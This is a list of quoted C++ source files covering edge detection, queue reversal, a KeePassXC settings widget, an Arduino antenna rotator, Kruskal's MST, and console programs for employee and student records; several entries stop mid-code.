    "#include \"edge_detector.hpp\"\n\nint main(){\n\n    std::string input_image_path = \"/Users/nitishsanghi/Documents/Stereo-Matching/000000_10.png\";\n    std::string output_image_path = \"/Users/nitishsanghi/Documents/Edge-Detector/Images/000000_10_sobel.png\";\n    std::string output_image_pathx = \"/Users/nitishsanghi/Documents/Edge-Detector/Images/000000_10_sobelx.png\";\n    std::string output_image_pathy = \"/Users/nitishsanghi/Documents/Edge-Detector/Images/000000_10_sobely.png\";\n    std::string output_image_pathp = \"/Users/nitishsanghi/Documents/Edge-Detector/Images/000000_10_p.png\";\n    std::string output_image_pathpx = \"/Users/nitishsanghi/Documents/Edge-Detector/Images/000000_10_px.png\";\n    std::string output_image_pathpy = \"/Users/nitishsanghi/Documents/Edge-Detector/Images/000000_10_py.png\";\n    std::string output_image_pathr = \"/Users/nitishsanghi/Documents/Edge-Detector/Images/000000_10_r.png\";\n    std::string output_image_pathrx = \"/Users/nitishsanghi/Documents/Edge-Detector/Images/000000_10_rx.png\";\n    std::string output_image_pathry = \"/Users/nitishsanghi/Documents/Edge-Detector/Images/000000_10_ry.png\";\n \n    EdgeDetector detector;\n    detector.loadImage(input_image_path);\n    detector.saveEdgeImage(output_image_path, detector.applyDetector(EdgeDetector::DetectorType::SOBEL, EdgeDetector::GradientType::MAG));\n    detector.saveEdgeImage(output_image_pathx, detector.applyDetector(EdgeDetector::DetectorType::SOBEL, EdgeDetector::GradientType::X));\n    detector.saveEdgeImage(output_image_pathy, detector.applyDetector(EdgeDetector::DetectorType::SOBEL, EdgeDetector::GradientType::Y));\n    detector.saveEdgeImage(output_image_pathp, detector.applyDetector(EdgeDetector::DetectorType::PREWITT, EdgeDetector::GradientType::MAG));\n    detector.saveEdgeImage(output_image_pathpx, detector.applyDetector(EdgeDetector::DetectorType::PREWITT, EdgeDetector::GradientType::X));\n    detector.saveEdgeImage(output_image_pathpy, detector.applyDetector(EdgeDetector::DetectorType::PREWITT, EdgeDetector::GradientType::Y));\n    detector.saveEdgeImage(output_image_pathr, detector.applyDetector(EdgeDetector::DetectorType::ROBERTSCROSS, EdgeDetector::GradientType::MAG));\n    detector.saveEdgeImage(output_image_pathrx, detector.applyDetector(EdgeDetector::DetectorType::ROBERTSCROSS, EdgeDetector::GradientType::X));\n    detector.saveEdgeImage(output_image_pathry, detector.applyDetector(EdgeDetector::DetectorType::ROBERTSCROSS, EdgeDetector::GradientType::Y));\n\n\n    return 0;\n}",
    "#include <iostream>\r\n#include <queue>\r\n#include <stack>\r\n\r\n// Function to reverse the order of elements in a queue\r\nvoid reverseQueue(std::queue<int>& q) {\r\n    std::stack<int> s;\r\n\r\n    // Dequeue elements from the queue and push them onto the stack\r\n    while (!q.empty()) {\r\n        s.push(q.front());\r\n        q.pop();\r\n    }\r\n\r\n    // Pop elements from the stack and enqueue them back into the queue\r\n    while (!s.empty()) {\r\n        q.push(s.top());\r\n        s.pop();\r\n    }\r\n}\r\n\r\n// Function to print the elements of a queue\r\nvoid printQueue(std::queue<int> q) {\r\n    while (!q.empty()) {\r\n        std::cout << q.front() << \" \";\r\n        q.pop();\r\n    }\r\n    std::cout << std::endl;\r\n}\r\n\r\nint main() {\r\n    std::queue<int> testQueue;\r\n    testQueue.push(1);\r\n    testQueue.push(2);\r\n    testQueue.push(3);\r\n    testQueue.push(4);\r\n    testQueue.push(5);\r\n    testQueue.push(6);\r\n\r\n    std::cout << \"Original queue: \";\r\n    printQueue(testQueue);\r\n\r\n    reverseQueue(testQueue);\r\n\r\n    std::cout << \"Reversed queue: \";\r\n    printQueue(testQueue);\r\n\r\n    return 0;\r\n}\r\n",
    "/*\n *  Copyright (C) 2018 KeePassXC Team <team@keepassxc.org>\n *\n *  This program is free software: you can redistribute it and/or modify\n *  it under the terms of the GNU General Public License as published by\n *  the Free Software Foundation, either version 2 or (at your option)\n *  version 3 of the License.\n *\n *  This program is distributed in the hope that it will be useful,\n *  but WITHOUT ANY WARRANTY; without even the implied warranty of\n *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n *  GNU General Public License for more details.\n *\n *  You should have received a copy of the GNU General Public License\n *  along with this program.  If not, see <http://www.gnu.org/licenses/>.\n */\n\n#include \"SettingsWidgetKeeShare.h\"\n#include \"ui_SettingsWidgetKeeShare.h\"\n\n#include \"config-keepassx.h\"\n#include \"gui/FileDialog.h\"\n#include \"gui/MessageBox.h\"\n#include \"keeshare/KeeShare.h\"\n\n#include <QStandardItemModel>\n#include <QStandardPaths>\n#include <QTextStream>\n\nSettingsWidgetKeeShare::SettingsWidgetKeeShare(QWidget* parent)\n    : QWidget(parent)\n    , m_ui(new Ui::SettingsWidgetKeeShare())\n{\n    m_ui->setupUi(this);\n\n    connect(m_ui->ownCertificateSignerEdit, SIGNAL(textChanged(QString)), SLOT(setVerificationExporter(QString)));\n    connect(m_ui->generateOwnCerticateButton, SIGNAL(clicked(bool)), SLOT(generateCertificate()));\n}\n\nSettingsWidgetKeeShare::~SettingsWidgetKeeShare()\n{\n}\n\nvoid SettingsWidgetKeeShare::loadSettings()\n{\n    const auto active = KeeShare::active();\n    m_ui->enableExportCheckBox->setChecked(active.out);\n    m_ui->enableImportCheckBox->setChecked(active.in);\n\n    m_own = KeeShare::own();\n    updateOwnCertificate();\n}\n\nvoid SettingsWidgetKeeShare::updateOwnCertificate()\n{\n    m_ui->ownCertificateSignerEdit->setText(m_own.certificate.signer);\n    m_ui->ownCertificateFingerprintEdit->setText(m_own.certificate.fingerprint());\n}\n\nvoid SettingsWidgetKeeShare::saveSettings()\n{\n    KeeShareSettings::Active active;\n    active.out = m_ui->enableExportCheckBox->isChecked();\n    active.in = m_ui->enableImportCheckBox->isChecked();\n    // TODO HNH: This depends on the order of saving new data - a better model would be to\n    //           store changes to the settings in a temporary object and check on the final values\n    //           of this object (similar scheme to Entry) - this way we could validate the settings before save\n    KeeShare::setOwn(m_own);\n    KeeShare::setActive(active);\n\n    config()->set(Config::KeeShare_QuietSuccess, m_ui->quietSuccessCheckBox->isChecked());\n}\n\nvoid SettingsWidgetKeeShare::setVerificationExporter(const QString& signer)\n{\n    m_own.certificate.signer = signer;\n    m_ui->ownCertificateSignerEdit->setText(m_own.certificate.signer);\n}\n\nvoid SettingsWidgetKeeShare::generateCertificate()\n{\n    m_own = KeeShareSettings::Own::generate();\n    m_ui->ownCertificateSignerEdit->setText(m_own.certificate.signer);\n    m_ui->ownCertificateFingerprintEdit->setText(m_own.certificate.fingerprint());\n}\n",
    "//ADD ACCEL/DECEL\n//ADD SPEED POT\n//ADD EL\n\n#include <Arduino.h>\n#include <U8g2lib.h>\n#include <Encoder.h>\n\n/*\n#define button_park 40\n*/\n\n#define homeAzPosition 55\n#define homeElPosition 0\n\n#define leftButtonPin 32\n#define rightButtonPin 33\n#define leftOutputPin 6\n#define rightOutputPin 7\n#define encAzPinA 3\n#define encAzPinB 21\n#define azPPDeg 5.33333\n\n#define azSpeedPin 54\n#define azSpeedMin 25\n#define azSpeedInc 4\n#define azSpeedDec 10\n#define azSpeedInterval 50\n\n#define encElPinA 19\n#define encElPinB 18\n#define upButtonPin 34\n#define downButtonPin 35\n#define upOutputPin 8\n#define downOutputPin 9\n#define elPPDeg 4\n\n#define elSpeedPin 53\n#define elSpeedMin 25\n#define elSpeedInc 10\n#define elSpeedDec 10\n#define elSpeedInterval 50\n\nunsigned long azSpeedStart = millis();\nunsigned long elSpeedStart = millis();\n\nEncoder AzEncoder(encAzPinA, encAzPinB);\nEncoder ElEncoder(encElPinA, encElPinB);\n\nU8G2_SSD1309_128X64_NONAME0_F_4W_SW_SPI displayLCD(U8G2_R0, /* clock=*/ 52, /* data=*/ 50, /* cs=*/ 49, /* dc=*/ 53, /* reset=*/ 51);  \n\nfloat currentAz = -100;\nfloat currentEl = -100;\n\nint azSpeedMax = 255;\nint azSpeedLeft = 0;\nint azSpeedRight = 0;\n\nint elSpeedMax = 255;\nint elSpeedUp = 0;\nint elSpeedDown = 0;\n\nvoid updateDisplay();\nvoid checkAzEl();\n\nvoid setup() {\n  Serial.begin(9600);\n\n  pinMode(leftButtonPin, INPUT);\n  pinMode(rightButtonPin, INPUT);\n  pinMode(leftButtonPin, INPUT_PULLUP);\n  pinMode(rightButtonPin, INPUT_PULLUP);\n\n  pinMode(leftOutputPin, OUTPUT);  \n  pinMode(rightOutputPin, OUTPUT);\n  analogWrite(leftOutputPin, azSpeedLeft);\n  analogWrite(rightOutputPin, azSpeedRight);\n\n  pinMode(upButtonPin, INPUT);\n  pinMode(downButtonPin, INPUT);\n  pinMode(upButtonPin, INPUT_PULLUP);\n  pinMode(downButtonPin, INPUT_PULLUP);\n\n  pinMode(upOutputPin, OUTPUT);\n  pinMode(downOutputPin, OUTPUT);\n  analogWrite(upOutputPin, elSpeedUp);\n  analogWrite(downOutputPin, elSpeedDown);\n\n  displayLCD.begin();\n\n  updateDisplay();\n}\nvoid loop() {\n\n  if(millis() - azSpeedStart >= azSpeedInterval){ //Az Button Stuff\n    //int tempAzSpeedMax = map(analogRead(azSpeedPin),0,1020,azSpeedMin,255);\n    int tempAzSpeedMax = 255;\n    \n    if(tempAzSpeedMax < azSpeedMax)azSpeedMax -= azSpeedDec;\n    else azSpeedMax = tempAzSpeedMax;\n\n    if(!digitalRead(leftButtonPin) && azSpeedRight == 0){\n      if(azSpeedLeft == 0)azSpeedLeft = azSpeedMin;\n      \n      azSpeedLeft += azSpeedInc;\n      if(azSpeedLeft > azSpeedMax)azSpeedLeft = azSpeedMax;\n    }\n    else{\n      azSpeedLeft -= azSpeedDec;\n      if(azSpeedLeft != 0 && azSpeedLeft < azSpeedMin) azSpeedLeft = 0;\n    }\n  \n    if(!digitalRead(rightButtonPin) && azSpeedLeft == 0){\n      if(azSpeedRight == 0)azSpeedRight = azSpeedMin;\n\n      azSpeedRight += azSpeedInc;\n      if(azSpeedRight > azSpeedMax)azSpeedRight = azSpeedMax;\n    }\n  else{\n    azSpeedRight -= azSpeedDec;\n    if(azSpeedRight != 0 && azSpeedRight < azSpeedMin) azSpeedRight = 0;\n  }\n\n  azSpeedStart = millis();\n\n  analogWrite(leftOutputPin, azSpeedLeft);\n  analogWrite(rightOutputPin, azSpeedRight);\n  }\n\n  if(millis() - elSpeedStart >= elSpeedInterval){ //Az Button Stuff\n    //int tempAzSpeedMax = map(analogRead(azSpeedPin),0,1020,azSpeedMin,255);\n    int tempElSpeedMax = 255;\n    \n    if(tempElSpeedMax < elSpeedMax)elSpeedMax -= elSpeedDec;\n    else elSpeedMax = tempElSpeedMax;\n\n    if(!digitalRead(upButtonPin) && elSpeedDown == 0){\n      if(elSpeedUp == 0)elSpeedUp = elSpeedMin;\n      \n      elSpeedUp += elSpeedInc;\n      if(elSpeedUp > elSpeedMax)elSpeedUp = elSpeedMax;\n    }\n    else{\n      elSpeedUp -= elSpeedDec;\n      if(elSpeedUp != 0 && elSpeedUp < elSpeedMin) elSpeedUp = 0;\n    }\n  \n    if(!digitalRead(downButtonPin) && elSpeedUp == 0){\n      if(elSpeedDown == 0)elSpeedDown = elSpeedMin;\n\n      elSpeedDown += elSpeedInc;\n      if(elSpeedDown > elSpeedMax)elSpeedDown = elSpeedMax;\n    }\n  else{\n    elSpeedDown -= elSpeedDec;\n    if(elSpeedDown != 0 && elSpeedDown < elSpeedMin) elSpeedDown = 0;\n  }\n\n  elSpeedStart = millis();\n\n  analogWrite(downOutputPin, elSpeedDown);\n  analogWrite(upOutputPin, elSpeedUp);\n  }\n\n  checkAzEl();\n}\nvoid checkAzEl(){\n  float tempAz = AzEncoder.read(); tempAz /= azPPDeg;\n  float tempEl = ElEncoder.read(); tempEl /= elPPDeg;\n  \n  tempAz += homeAzPosition;\n\n  if(tempAz < 0)tempAz += 360;\n  else if(tempAz > 360) tempAz -= 360;\n  /*if(tempEl < 0){\n    ElEncoder.write(0);\n    tempEl = 0;\n  }\n  else if(tempEl > 90){\n    ElEncoder.write(360);\n    tempEl = 90;\n  }*/\n\n  if(tempAz != currentAz){\n    currentAz = tempAz;\n    updateDisplay();\n  }\n\n  if(tempEl != currentEl){\n    currentEl = tempEl;\n    updateDisplay();\n  }\n}\nvoid updateDisplay(){\n  \n  displayLCD.setFontMode(1); \n  displayLCD.setDrawColor(1);\n  displayLCD.setFont(u8g2_font_osr26_tn);\n  displayLCD.clearBuffer();\n\n  if(currentAz >= 0 && currentAz < 10){displayLCD.setCursor(38,25);}\n  else if(currentAz >= 10 && currentAz < 100){displayLCD.setCursor(28,25);}\n  else{displayLCD.setCursor(17,25);}\n  displayLCD.print(currentAz,1);\n\n  if(currentEl <= -10",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\n#include <fstream>\n#include <vector>\n#include <algorithm>\n#include <string>\n\nusing namespace std;\n\nclass Arete {\npublic:\n    int src, dest, poids;\n\n    Arete(int src, int dest, int poids) {\n        this->src = src;\n        this->dest = dest;\n        this->poids = poids;\n    }\n};\n\nclass Graphe {\npublic:\n    int V, E;\n    vector<string> MST;\n    vector<Arete> aretes;\n\n    Graphe(int V, int E) {\n        this->V = V;\n        this->E = E;\n    }\n\n    void ajouterArete(int src, int dest, int poids) {\n        Arete arete(src, dest, poids);\n        aretes.push_back(arete);\n    }\n    \n    int trouver(vector<int>& parent, int i) {\n        if (parent[i] == -1)\n            return i;\n        return trouver(parent, parent[i]);\n    }\n    \n    void kruskalMST() {\n        vector<int> parent(V, -1);        \n        sort(aretes.begin(), aretes.end(), [](Arete a, Arete b) {\n            return a.poids < b.poids;\n            });\n\n        for (Arete arete : aretes) {\n            int x = trouver(parent, arete.src);\n            int y = trouver(parent, arete.dest);            \n            \n            if (x != y) {\n                cout << arete.src << \" - \" << arete.dest << \" : \" << arete.poids << endl;\n                MST.push_back( \"(\" + to_string(arete.src) + \", \" + to_string(arete.dest) + \", \" + to_string(arete.poids) + \"),\\n\");\n                parent[x] = y;\n            }\n        }\n    }\n\n    void exporter_Kruskal() {\n\n        ofstream outputFile(\"C:/Users/RENTO/Desktop/Recherche_Op\u00e9rationnelle/Kruskal_data.txt\");\n\n        if (outputFile.is_open()) {\n\n            outputFile << \"[\" << endl;\n            for (Arete arete : aretes) {\n                outputFile << \"(\" << arete.src << \", \" << arete.dest << \", \" << arete.poids << \"),\" << endl;\n            }\n            outputFile << \"]\" << endl;\n\n            outputFile.close();\n            cout << \"Exportation de Kruskal reussie\" << endl;\n        }\n        else {\n            cout << \"Echec d'acces au fichier\" << endl;\n        }\n    }\n\n    void exporter_Kruskal_MST() {\n\n        ofstream outputFile(\"C:/Users/RENTO/Desktop/Recherche_Op\u00e9rationnelle/Kruskal_MST.txt\");\n\n        if (outputFile.is_open()) {\n\n            outputFile << \"[\" << endl;\n            for (string var : MST)\n            {\n                outputFile << var;\n            }            \n            outputFile << \"]\" << endl;\n\n            outputFile.close();\n            cout << \"Exportation de Kruskal MST reussie\" << endl;\n        }\n        else {\n            cout << \"Echec d'acces au fichier\" << endl;\n        }\n    }\n};\n\n\nvoid Dessiner() {\n    string pythonScriptPath = \"C:/Users/RENTO/Desktop/Recherche_Op\u00e9rationnelle/Kruskal_Draw.py\";\n\n    string command = \"python \" + pythonScriptPath;\n\n    int result = system(command.c_str());\n\n    if (result == 0) {\n        cout << \"Les graphes ont ete dessines avec succes.\";\n    }\n    else {\n        cout << \"Erreur d'execution\";\n    }\n}\n\nint main() {\n    Graphe graphe(5, 5);\n    \n    graphe.ajouterArete(0, 1, 6);\n    graphe.ajouterArete(1, 2, 5);\n    graphe.ajouterArete(0, 2, 8);\n    graphe.ajouterArete(2, 3, 1);\n    graphe.ajouterArete(3, 4, 2);\n\n    graphe.exporter_Kruskal();\n\n    cout << \"Arbre couvrant minimal de Kruskal :\" << endl;\n    graphe.kruskalMST();\n    graphe.exporter_Kruskal_MST();\n    Dessiner();\n\n\n    /*\n    int nbrSommet, nbrArret;\n    cout << \"Entrez le nombre de sommets : \" << endl;\n    cin >> nbrSommet;\n    cout << \"Entrez le nombre d'arrets : \" << endl;\n    cin >> nbrArret;\n\n    Graphe graphe1(nbrSommet, nbrArret);\n    int dep, dest, poids;\n    for (int i = 0;i < nbrArret;i++) {\n        cout << \"Entrez le sommet de depart / destination / poids : \" << endl;\n        cin >> dep >> dest >> poids;\n        graphe1.ajouterArete(dep, dest, poids);\n    }\n    */\n\n    return 0;\n}",
    "#include <iostream>\n#include <string>\n#include <vector>\n\nusing namespace std;\n\n// Define a struct for Employee\nstruct Employee {\n    int id;\n    string name;\n    double salary;\n};\n\n// Function to add a new employee\nvoid addEmployee(vector<Employee>& employees) {\n    Employee newEmployee;\n    \n    cout << \"---------------------\\nEnter employee ID: \";\n    cin >> newEmployee.id;\n    \n    // Check if an employee with the same ID already exists\n    for (const Employee& emp : employees) {\n        if (emp.id == newEmployee.id) {\n            cout << \"Employee with ID \" << newEmployee.id << \" already exists. Please enter a different ID.\\n---------------------\" << endl;\n            return; // Exit the function without adding the employee\n        }\n    }\n    \n    cout << \"Enter employee name: \";\n    cin.ignore(); // Clearing input buffer \n    getline(cin, newEmployee.name);\n    \n    cout << \"Enter employee salary: $\";\n    cin >> newEmployee.salary;\n    \n    employees.push_back(newEmployee);\n    \n    cout << \"Employee added successfully!\\n---------------------\" << endl;\n}\n\n// Function to print all employee information\nvoid printAllEmployees(const vector<Employee>& employees) {\n    cout << \"---------------------\\nList of Employees:\" << endl;\n    for (const Employee& emp : employees) {\n        cout << \"ID: \" << emp.id << \", Name: \" << emp.name << \", Salary: $\" << emp.salary << endl;\n    }\n    cout << \"---------------------\\n\";\n}\n\n// Function to print salary by employee ID\nvoid printEmployeeSalary(const vector<Employee>& employees, int id) {\n    bool found = false;\n    for (const Employee& emp : employees) {\n        if (emp.id == id) {\n            cout << \"---------------------\\nEmployee ID: \" << emp.id << \", Salary: $\" << emp.salary << endl;\n            cout << \"---------------------\\n\";\n            found = true;\n            break;\n        }\n    }\n    if (!found) {\n        cout << \"Employee with ID \" << id << \" not found.\" << endl << \"---------------------\\n\";\n    }\n}\n\n// Function for employee payout\nvoid employeePayout(vector<Employee>& employees) {\n    int empId;\n    double bonus;\n\n    cout << \"---------------------\\nEnter employee ID: \";\n    cin >> empId;\n\n    bool found = false;\n    for (Employee& emp : employees) {\n        if (emp.id == empId) {\n            cout <<\"Employee name: \" << emp.name;\n            cout <<\"\\nEmployee salary: $\" << emp.salary;\n            cout << \"\\nEnter bonus for employee: $\";\n            cin >> bonus;\n            double totalPay = emp.salary + bonus;\n            cout << \"\\nTotal pay for \" << emp.name << \" is: $\" << totalPay << \"\\n---------------------\" << endl ;\n            found = true;\n            break;\n        }\n    }\n    if (!found) {\n        cout << \"Employee with ID \" << empId << \" not found.\"<< \"\\n---------------------\" << endl ;\n    }\n}\n\n// Function to print sack letter for employee\nvoid printSackLetter(const Employee& emp) {\n    cout << \"---------------------\\nDear \" << emp.name << \",\\n\";\n    cout << \"We regret to inform you that your employment with our company has been terminated.\\n\";\n    cout << \"Please collect your personal belongings and return any company property.\\n\";\n    cout << \"We wish you the best in your future endeavors.\\n\\n\";\n    cout << \"Sincerely,\\nManagement\\n---------------------\" << endl;\n}\n\n// Function to delete an employee\nvoid deleteEmployee(vector<Employee>& employees) {\n    int empId;\n    char choice;\n\n    cout << \"---------------------\\nEnter employee ID to delete: \";\n    cin >> empId;\n\n    bool found = false;\n    for (auto it = employees.begin(); it != employees.end(); ++it) {\n        if (it->id == empId) {\n            found = true;\n            cout << \"Do you want to generate a sack letter for employee \" << it->name << \"? (y/n): \";\n            cin >> choice;\n            if (choice == 'y' || choice == 'Y') {\n                printSackLetter(*it);\n            }\n            employees.erase(it);\n            cout << \"Employee with ID \" << empId << \" deleted successfully.\\n---------------------\" << endl;\n            break;\n        }\n    }\n    if (!found) {\n        cout << \"Employee with ID \" << empId << \" not found.\" << \"\\n---------------------\" << endl;\n    }\n}\n\nint main() {\n    vector<Employee> employees;\n    char choice;\n\n    do {\n        cout << \"\\nOptions:\\n1. Add new employee\\n2. Print all employees' info\\n3. Print employee salary by ID\\n4. Employee payout\\n5. Delete employee\\n6. Exit\\n\";\n        cout << \"Enter your choice: \";\n        cin >> choice;\n\n        switch (choice) {\n            case '1':\n                addEmployee(employees);\n                break;\n            case '2':\n                printAllEmployees(employees);\n                break;\n            case '3':\n                int empId;\n                cout << \"Enter employee ID to print salary: \";\n                cin >> empId;\n                printEmployeeSalary(employees, empId);\n                break;\n            case '4':\n                employeePayout(employees);\n                break;\n   ",
    "#include <iostream>\n#include <string> // Include the <string> header for getline\nusing namespace std;\n\nstruct DetailAlamat {\n    string desa;\n    string kota;\n};\nstruct Mahasiswa {\n    string nim;\n    string nama;\n    DetailAlamat alamat;\n    int umur; // Added umur variable\n};\nint main() {\n    Mahasiswa mhs[3];\n    for (int i = 0; i < 3; i++) {\n        cout << \"Data Ke-\" << (i + 1) << \":\" << endl;\n        cout << \"Nomor Mahasiswa : \";\n        getline(cin, mhs[i].nim);\n        cout << \"Nama Mahasiswa : \";\n        getline(cin, mhs[i].nama);\n\n        cout << \"Alamat Mahasiswa : \" << endl;\n        cout << \"\\t Nama Desa : \";\n        getline(cin, mhs[i].alamat.desa);\n        cout << \"\\t Nama Kota : \";\n        getline(cin, mhs[i].alamat.kota);\n        cout << \"Umur Mahasiswa : \";\n        cin >> mhs[i].umur;\n        cin.ignore(); // Ignore newline character\n        cout << endl;\n    }\n    for (int i = 0; i < 3; i++) {\n        cout << endl;\n        cout << \"Data Mahasiswa Ke-\" << (i + 1) << \":\" << endl;\n        cout << \"\\n NIM : \" << mhs[i].nim;\n        cout << \"\\n Nama : \" << mhs[i].nama;\n        cout << \"\\n Alamat : \";\n        cout << \"\\n \\t Desa : \" << mhs[i].alamat.desa;\n        cout << \"\\n \\t Kota : \" << mhs[i].alamat.kota;\n        cout << \"\\n Umur : \" << mhs[i].umur;\n        cout << endl;\n    }\n}",
    "#include <iostream>\n#include <string>\nusing namespace std;\n\nstruct DetailAlamat {\n    string desa;\n    string kota;\n};\n\nstruct Mahasiswa {\n    string nim;\n    string nama;\n    DetailAlamat alamat;\n    int umur;\n};\n\nint main() {\n    Mahasiswa mhs[3];\n    for (int i = 0; i < 3; i++) {\n        cout << \"Data Ke-\" << (i + 1) << \":\" << endl;\n        cout << \"Nomor Mahasiswa : \";\n        getline(cin, mhs[i].nim);\n        cout << \"Nama Mahasiswa : \";\n        getline(cin, mhs[i].nama);\n        cout << \"Alamat Mahasiswa : \" << endl;\n        cout << \"\\t Nama Desa : \";\n        getline(cin, mhs[i].alamat.desa);\n        cout << \"\\t Nama Kota : \";\n        getline(cin, mhs[i].alamat.kota);\n        cout << \"Umur Mahasiswa : \";\n        cin >> mhs[i].umur;\n        cin.ignore();\n        cout << endl;\n    }\n        for (int i = 0; i < 3; i++) {\n            cout << endl;\n            cout << \"Data Mahasiswa Ke-\" << (i + 1) << \":\" << endl;\n            cout << \"\\n NIM : \" << mhs[i].nim;\n            cout << \"\\n Nama : \" << mhs[i].nama;\n            cout << \"\\n Alamat : \";\n            cout << \"\\n \\t Desa : \" << mhs[i].alamat.desa;\n            cout << \"\\n \\t Kota : \" << mhs[i].alamat.kota;\n            cout << \"\\n Umur : \" << mhs[i].umur;\n            cout << endl;\n        }\n    }\n\n",
    "//hashtable firaol Berehanu \n//inputs a list of number using a key\n//using changing to stor multiple values at one idnex\n//also has rehash if the function becomes to crowed by having a index\n//source - youtbe and stakoverfolow\n\n\n#include <iostream>\n#include <cstring>\n#include <vector>\n#include <iomanip> \n#include <fstream>\n\nusing namespace std;\n// Struct definition\nstruct Student {\n    char givenName[100];\n    char surname[100];\n    float grade;\n    int studentID;\n    Student* next = NULL;\n};\n\n// Function declarations\nStudent** addPupils(Student** roster, int &currentID, int &capacity);\nStudent** manAdd(Student** roster, int &currentID, int &capacity);\nvoid displayAll(Student** roster, int capacity);\nvoid display(Student** roster, int capacity);\nvoid eliminate(Student** roster, int capacity);\nvoid resetRoster(Student* roster[], int capacity);\nvoid printChain(Student* current);\nStudent** rehashRoster(Student** roster, Student** newRoster, int &capacity, int currentID);\n\n// Main function\nint main() {\n    srand(time(0));\n    bool exitProgram = false;\n    Student** roster = new Student*[100];\n    char userInput[7];\n    int currentID = 0;\n    int capacity = 100;\n    resetRoster(roster, capacity);\n    while (!exitProgram) {\n        cout << \"Please enter a valid command (ADD, MADD, PRINT, ALL(PRINT ALL), DELETE, QUIT):\" << endl;\n        cin >> userInput;\n        if (strcmp(userInput, \"MADD\") == 0) {\n            roster = manAdd(roster, currentID, capacity);\n        }\n        if (strcmp(userInput, \"ADD\") == 0) {\n            roster = addPupils(roster, currentID, capacity);\n        }\n        else if (strcmp(userInput, \"ALL\") == 0) {\n            displayAll(roster, capacity);\n        }\n        else if (strcmp(userInput, \"PRINT\") == 0) {\n            display(roster, capacity);\n        }\n        else if (strcmp(userInput, \"DELETE\") == 0) {\n            eliminate(roster, capacity);\n        }\n        else if (strcmp(userInput, \"QUIT\") == 0) {\n            exitProgram = true;\n        }\n    }\n    return 0;\n}\n\n// Function to add pupils\nStudent** addPupils(Student** roster, int &currentID, int &capacity) {\n    int students;\n    cout << \"How many students would you like to add?\" << endl;\n    cin >> students;\n    for (int i = 0; i < students; i++) {\n        char input[100];\n        char givenName[100];\n        char surname[100];\n        fstream givenFile(\"givenName.txt\");\n        fstream surnameFile(\"surname.txt\");\n        int count;\n        int num = (rand() % 20) + 1;\n        int num2 = (rand() % 20) + 1;\n        Student* newStudent = new Student();\n        count = 1;\n        while (givenFile.getline(input, 100, '\\n')) {\n            if (count == num) {\n                strcpy(givenName, input);\n                count++;\n            }\n            count++;\n        }\n        givenFile.close();\n        count = 1;\n        while (surnameFile.getline(input, 100, '\\n')) {\n            if (count == num2) {\n                strcpy(surname, input);\n                count++;\n            }\n            count++;\n        }\n        surnameFile.close();\n        float r = static_cast <float> (rand()) / static_cast <float> (RAND_MAX);\n        r *= 23;\n        while (r > 4) {\n            r -= 4;\n            while (r < 2) {\n                r += 1;\n            }\n        }\n        strcpy(newStudent->givenName, givenName);\n        strcpy(newStudent->surname, surname);\n        newStudent->studentID = currentID;\n        newStudent->grade = r;\n        if (roster[(currentID) % capacity] == NULL) {\n            roster[(currentID % capacity)] = newStudent;\n        }\n        else {\n            if (roster[(currentID) % capacity]->next == NULL) {\n                roster[currentID % capacity]->next = newStudent;\n            }\n            else {\n                if (roster[(currentID) % capacity]->next->next == NULL) {\n                    roster[currentID % capacity]->next->next = newStudent;\n                }\n                else {\n                    Student** newRoster = new Student*[capacity * 2];\n                    resetRoster(newRoster, capacity * 2);\n                    roster = rehashRoster(roster, newRoster, capacity, currentID);\n                    roster[currentID % capacity]->next = newStudent;\n                }\n            }\n        }\n        currentID++;\n    }\n    return roster;\n}\n\n// Function to manually add a student\nStudent** manAdd(Student** roster, int &currentID, int &capacity) {\n    char input[100];\n    char givenName[100];\n    char surname[100];\n    float grade;\n    Student* newStudent = new Student();\n    cout << \"Enter the first name:\" << endl;\n    cin >> givenName;\n    cin.clear();\n    cout << \"Enter the last name:\" << endl;\n    cin >> surname;\n    cin.clear();\n    cout << \"Enter the grade:\" << endl;\n    cin >> grade;\n    cin.clear();\n    strcpy(newStudent->givenName, givenName);\n    strcpy(newStudent->surname, surname);\n    newStudent->studentID = currentID;\n    newStudent->grade = grade;\n    if (roster[(currentID) % capacity] == NULL) {\n        r",
